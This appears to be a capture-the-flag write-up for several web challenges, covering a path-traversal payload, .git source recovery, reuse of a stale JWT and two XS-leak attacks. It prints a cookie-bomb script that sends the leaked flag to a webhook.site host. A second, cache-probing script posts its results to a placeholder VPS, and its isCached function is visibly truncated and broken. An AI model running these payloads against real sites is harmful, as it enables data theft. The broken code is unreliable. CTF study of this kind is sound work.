My solution for some web challenges in this competition

## The Flash

Use DOM breakpoints in Chrome devtools, right click on `p` tag and chose `Break on -> subtree modifications` then step over to get flag

    r = s.get(TARGET + next)

## Xtra Salty Sardines

Pay attention to the flowing lines:
```js
const name = req.body.name
    .replace("&", "&amp;")
    .replace('"', "&quot;")
    .replace("'", "&apos;")
    .replace("<", "&lt;")
    .replace(">", "&gt;");
```
I abuse that:

> The `replace()` method returns a new string with some or all matches of a `pattern` replaced by a replacement. The `pattern` can be a string or a `RegExp`, and the replacement can be a string or a function called for each match. If pattern is a **string**, only the **first** occurrence will be replaced.

## Art Gallery

LFI in `member` parameter.

> Noted that `/proc/1/cwd/` point to the current working directory in the docker container.
{: .prompt-tip  }

Send the following payload to fetch `Dockerfile`.

```
https://art-gallery.web.actf.co/gallery/?member=../../../../proc/1/cwd/Dockerfile
```

Dockerfile:
```docker
FROM node:17-bullseye-slim

WORKDIR /app
COPY . .
RUN mv git .git
RUN npm ci

ENV PORT=8080

EXPOSE 8080

CMD ["node", "index.js"]
```

The next step is to exploit the `.git` folder using [GitHacker](https://github.com/WangYihang/GitHacker).

After fetching all sources, use `git log` to check log commit.

## Secure Vault

Create an account: `bla:bla` then save the `token` value (jwt of bla account) after that `Delete account`. Then set the cookie value with `token:<jwt token of bla account>` -> return flag.

The reason why it works is due to the following two lines in `index.js`:
```js
const user = users.get(res.locals.user.uid);
res.type("text/plain").send(user.restricted ? user.vault : flag);
```
if we send an old jwt, then `user={}` and `user.restricted=undefined` (because it has been already deleted from `UserStore`).

## NoFlags

Dockerfile:

```docker
FROM php:8.1.5-apache-bullseye

COPY printflag /printflag
RUN chmod 111 /printflag
COPY src /var/www/html


RUN chown -R root:root /var/www/html && chmod -R 555 /var/www/html        
RUN mkdir /var/www/html/abyss &&\
    chown -R root:root /var/www/html/abyss &&\
    chmod -R 333 abyss

EXPOSE 80
```
From this file, i figure out following things:
- `printflag` a file with only-executable permission that used to print flag
- `/var/www/html`: readable and executable permission
- `/var/www/html/abyss`: writable and executable permission

=> The target to achieve is RCE using sqlite injection.

## Sustenance

I had worked in this challenge for 3 days, searching, trying, playing around with it but i couldn't come up with a solution. So i will write what i have learned from orther people's writeups ðŸ˜— .

Overview:

![overview](Sustenance/overview.png)
_overview_

Source:
```js
const express = require("express");
const cookieParser = require("cookie-parser");
const path = require("path");

const app = express();
app.use(express.urlencoded({ extended: false }));

// environment config
const port = Number(process.env.PORT) || 8080;
const adminSecret = process.env.ADMIN_SECRET || "secretpw";
const flag =
    process.env.FLAG ||
    "actf{someone_is_going_to_submit_this_out_of_desperation}";

function queryMiddleware(req, res, next) {
    res.locals.search =
        req.cookies.search || "the quick brown fox jumps over the lazy dog";
    // admin is a cool kid
    if (req.cookies.admin === adminSecret) {
        res.locals.search = flag;
    }
    next();
}

app.use(cookieParser());

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/s", (req, res) => {
    if (req.body.search) {
        for (const [name, val] of Object.entries(req.body)) {
            res.cookie(name, val, { httpOnly: true });
        }
    }
    res.redirect("/");
});

app.get("/q", queryMiddleware, (req, res) => {
    const query = req.query.q || "h"; // h
    let status;
    if (res.locals.search.includes(query)) {
        status =
            "succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance";
    } else {
        status = "failed";
    }
    res.redirect(
        "/?m=" +
        encodeURIComponent(
            `your search that took place at ${Date.now()} has ${status}`
        )
    );
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
```

Working flow:
- `Set search string` functionality sets the "search string" and placed it in your cookie.
- `Search string` functionality return the status (`succeeded`/`failed`) whether the "search string" (stored in cookie) includes the string in `q` - GET parameter.

From those things, we can obviously figure out that it is kind of [XS-Leaks](https://xsleaks.dev/) challenge.

_There are 2 approach for solving the challenge: Cookie bomb and Cache probing attack._

### Cookie bomb

The idea and solution came from [Strellic](https://brycec.me/) and it is also the intended solution.

For anyone who don't know about this attack technique, [this blog](https://blog.rubiya.kr/index.php/2020/10/02/cookie-bomb/) will be a good reference.

We have already known that the server stored the string (if the user is admin, it will be the flag) in cookie and the response's length in two case is difference (the successful one is longer than another). So if we make the `search string` very long but controling it to be just barely under the maximum of request header size then we can use the cookie bomb attack to trigger [error-event](https://xsleaks.dev/docs/attacks/error-events/) with a view to figuring out whether it was successful or not.   

But there is still one problem we have to deal with. As you can see, `SameSite` has not been explicitly specified, the cookie will be treated as `SameSite=Lax` so that we can't make the admin bot visit our page and send a lot of cookie because the "Lax" cookie can just be sent by [those ways](https://www.appsecmonkey.com/blog/samesite-cookies#:~:text=Lax%20cookies%2C%20however%2C%20will%20be%20sent%20when%20navigating) and it have to obey the [samesite](https://web.dev/same-site-same-origin/) rule. And @Strellic's trick solved the problem. He used the XSS vulnerability from `Xtra Salty Sardines` challenge to exploit. Both `https://sustenance.web.actf.co/` and `https://xtra-salty-sardines.web.actf.co/` were treated as same site because of having the same [eTLD+1](https://web.dev/same-site-same-origin/#:~:text=In%20other%20words%2C%20the%20eTLD%2B1%20is%20the%20effective%20TLD%20and%20the%20part%20of%20the%20domain%20just%20before%20it) - `actf.co`.

Here is his exploit script:

```html
<>'";<form action='https://sustenance.web.actf.co/s' method=POST><input id=f /><input name=search value=a /></form>
    <script>
        const $ = document.querySelector.bind(document);
        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        let i = 0;
        const stuff = async(len = 3500) => {
            let name = Math.random();
            $("form").target = name;
            let w = window.open('', name);
            $("#f").value = "_".repeat(len);
            $("#f").name = i++;
            $("form").submit();
            await sleep(100);
        };
        const isError = async(url) => {
            return new Promise(r => {
                let script = document.createElement('script');
                script.src = url;
                script.onload = () => r(false);
                script.onerror = () => r(true);
                document.head.appendChild(script);
            });
        }
        const search = (query) => {
            return isError("https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query));
        };
        const alphabet = "etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ";
        const url = "//webhook.site/fe29ff9f-908c-4508-9bbd-14848cf2c3f8";
        let known = "actf{";
        window.onload = async() => {
            navigator.sendBeacon(url + "?load");
            await Promise.all([stuff(), stuff(), stuff(), stuff()]);
            await stuff(1600);

            navigator.sendBeacon(url + "?go");
            while (true) {
                for (let c of alphabet) {
                    let query = known + c;
                    if (await search(query)) {
                        navigator.sendBeacon(url, query);
                        known += c;
                        break;
                    }
                }
            }
        };
    </script>
```

`Promise.all()` was used to increase the cookie's size slowly because sending tons of cookie in one request will get a `502 Bad Gateway` status.

One thing @Strellic didn't indicate in his solution is the maximum size of request header. Using `Burp Suite` i noted that remote server used `HTTP/2 module` and `nginx` as web server. After spending a couple of minutes on searching, i came across [this](https://tryhexadecimal.com/guides/http/431-request-header-fields-too-large#:~:text=of%20all%20headers.-,The%20default%20is%2016K,-%2C%20which%20means%20all) site. According to it, the maxium size is 16k in default so we can adjust the `len` in `stuff()` to make it barely under the limit.

### Cache probing

After reading and trying a lot of exploit techniques in xs-leak wiki, I finally thought about cache probing. But in the end i think it is too complicated so i decide to skip it and wait for the writeup ðŸ˜”.   

You can read the original writeup from [this](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) and [this blog](https://blog.maple3142.net/2022/05/03/angstromctf-2022-writeups/).

The idea is to abuse the cache, if the returned response is "succeeded" then it will be cache with the cache key `...?m=your search that took place at <Date.now()> has succed ... require sustenance` so we can use `fetch` with `cache: 'force-cache'` and bruteforce the `Date.now()` value to measure the response's time. If the time is small than the "base time" than it is likely that the flag contains the current bruteforcing character.

#### Assuming that cache partitioning worked

There is still one problem we have to come over. Now, Chrome will partition its HTTP cache starting in Chrome 86 ([Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)). 

> With cache partitioning, cached resources will be keyed using a new "Network Isolation Key" in addition to the resource URL. The Network Isolation Key is composed of the top-level site and the current-frame site.
{: .prompt-info  }

 So if you plan to place your exploit script in a page (for example it is hosted by ngrok), the cache key will be `(https://id.ngrok.io, https://id.ngrok.io, https://sustenance.web.actf.co/?m=...)` but the expected cache key should be `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =...)` in order to make the cache shareable. By using the Strellic's trick above, we can easily solve the problem. Beside, the cookie attribute is `SameSite=Lax` (explained above) so we have to use `window.open` for top-level navigations ortherwise the cookie won't be sent

```html

<script>
// to hang the connection

const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms))

async function go() {
  await calculateBaseline()
  main()

  async function calculateBaseline() {
    var m = Math.random()
    let win = window.open('https://sustenance.web.actf.co/?m=cached_' + m)
    
    // NOTE: this number can be decreased by detecting window load
    await sleep(500)
    win.close()
    let total = 0
    for(let i=1; i<=5; i++) {
      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=cached_' + m)
      total += ts
      report(`Cached time, round: ${i}, ${ts}ms`)
    }
    // NOTE: 0.5 is just a random guess
    baseLine = (total/5) + 0.5
    report(`Baseline: ${baseLine}`)
    
    // NOTE: adjust baseline, should not be more than 3 ms based on previous testing
    if (baseLine > 3) {
      baseLine = 3

      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=not_cached_' + m)
      report(`Not Cached time, round: ${i}, ${ts}ms`)
    }
  }

  // NOTE: server is quite fast so no need to set timeout
  async function getLoadTime(url) {
    const start = performance.now()
    await fetch(url, { cache: 'force-cache', mode: 'no-cors' })
    return performance.now() - start

  async function isCached(str) {

        if (total <= baseLine) {
          report(`isCached success, str=${str}, i=${i}, start=${start}, total=${total}`)
          return true
        }
      }
    }
    return false
  }

  async function main() {
    let flag = 'actf{yummy_'
    
    // NOTE: we can leak the charset first to speed up the process
    let chars = 'acefsmntuy_}'.split('')
    while(flag[flag.length - 1] !== '}') {
      for(let char of chars) {
        report('trying:'  + flag + char)
        if (await isCached(flag + char)) {
          flag += char
          report('flag:' + flag)
          break
        }
      }
    }
  }

  async function report(data) {
    console.log(data)
    // TODO: change to your VPS
    return fetch('https://YOUR_VPS/', { method: 'POST', body: data, mode: 'no-cors' }).catch(err => err);
  }
}
</script>
```

#### There is no cache partitioning

Some people find out the fact that cache partitioning didn't work in headless chrome (this one is an [example](https://ctf.zeyu2001.com/2021/uiuctf-2021/yana#this-shouldnt-have-worked)).

So you can use the previous script on your page, host it by ngrok and submit this url to admin.
